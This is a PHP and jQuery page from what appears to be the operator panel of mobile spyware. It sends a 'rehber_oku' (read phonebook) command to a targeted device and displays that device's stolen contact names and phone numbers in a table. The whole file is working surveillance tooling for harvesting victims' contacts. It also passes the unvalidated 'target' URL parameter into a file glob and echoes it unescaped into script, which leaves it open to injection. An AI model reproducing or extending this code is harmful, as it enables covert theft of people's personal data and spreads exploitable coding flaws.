<?php 
require_once 'module_controller.php';

$uid_device = $_GET['target'];
$contact_path = './private/storage/contact-'.$uid_device.'*';
$filelist = glob($contact_path);
$contact_file_list = array();
foreach ($filelist as $file){
    $c_data = explode("/", $file);
    $num = (count($c_data) - 1);
    array_push($contact_file_list, $c_data[$num]);
}

?>

    <div class="row">
        <div class="col-md-11 col-lg-offset-0">
            <div class="well">

                <img id="command-sender-id" name="command-sender-id" src="./images/signal-sender.png" style='height:48px;'/>

                <div class="col-md-10 col-lg-offset-0">
                        <label for="select" class="col-lg-2 control-label">Saved Files</label>
                        <div class="col-lg-4">
                            <select class="form-control" id="selected-file" name="selected-file">
                                <?php
                                foreach ($contact_file_list as $file_name){
                                    echo '<option>'.$file_name.'</option>';
                                }
                                ?>
                            </select>
                        </div>

                        <button type="button" id="btn-show-contact" name="btn-show-contact" class="btn btn-default">Show File</button>
                </div>

                <div class="row"></div>
                <br><br>
                <legend>Phonebook</legend>
                <div class="row">
                    <table class="table table-striped table-hover ">
                            <thead>
                            <tr>
                                <th>#</th>
                                <th>Ad - Soyad</th>
                                <th>Tel. No.</th>
                                <th>Type</th>
                            </tr>
                            </thead>
                            <tbody id="contact-content-id">

                            </tbody>
                    </table>
                </div>
                <br><br>
            </div>
        </div>
    </div>

<script>

    $("#btn-show-contact").click(function() {
        $('#contact-content-id').empty();
        $('#contact-content-id').html('');
        var selected_file = $( "#selected-file option:selected" ).text();
        var commands = {
            contact_file_name: selected_file
        };
        console.log(commands);
        $.post( "commands.php", commands , function( data, err ) {
            console.log(data);
            console.log(err);
            if (data){
                Toastify({
                    text: "命令已发送！",
                    backgroundColor: "linear-gradient(to right, #008000, #00FF00)",
                    className: "info",
                }).showToast();
                var index_contact = 0;
                $.each(data['contact_list'], function(i, item) {
                    index_contact +=1;
                    // $('<tr>').html(
                    //     "<td>" + index_contact + "</td><td>"
                    //     + data['contact_list'][i].displayName  + "</td><td>"
                    //     + data['contact_list'][i]['phoneNumbers'][0]['normalizedNumber']  + "</td><td>"
                    //     + data['contact_list'][i]['phoneNumbers'][0]['type'] + "</td>").appendTo('#contact-content-id');
                    var phoneNumber = item.phoneNumbers && item.phoneNumbers[0];
                    // 如果 phoneNumber 不存在，使用默认值或提示信息
                    var normalizedNumber = phoneNumber ? phoneNumber.normalizedNumber : 'N/A';
                    var type = phoneNumber ? phoneNumber.type : 'N/A';

                    $('<tr>').html(
                        "<td>" + index_contact + "</td><td>"
                        + item.displayName  + "</td><td>"
                        + normalizedNumber  + "</td><td>"
                        + type + "</td>").appendTo('#contact-content-id');
                });
            } else {
                Toastify({
                    text: "命令发送失败！",
                    backgroundColor: "linear-gradient(to right,#FF0000, #990000)",
                    className: "info",
                }).showToast();
            }

        }, "json");
    });

    $("#command-sender-id").click(function() {
        $.post( "commands.php", { send_command: true, target:"<?php echo $uid_device;?>", type: "rehber_oku", value: true}, function( data, err ) {
            if (data.status){
                Toastify({
                    text: "命令已发送！",
                    backgroundColor: "linear-gradient(to right, #008000, #00FF00)",
                    className: "info",
                }).showToast();
            } else {
                Toastify({
                    text: "命令发送失败！",
                    backgroundColor: "linear-gradient(to right,#FF0000, #990000)",
                    className: "info",
                }).showToast();
            }

        }, "json");

    });

</script>
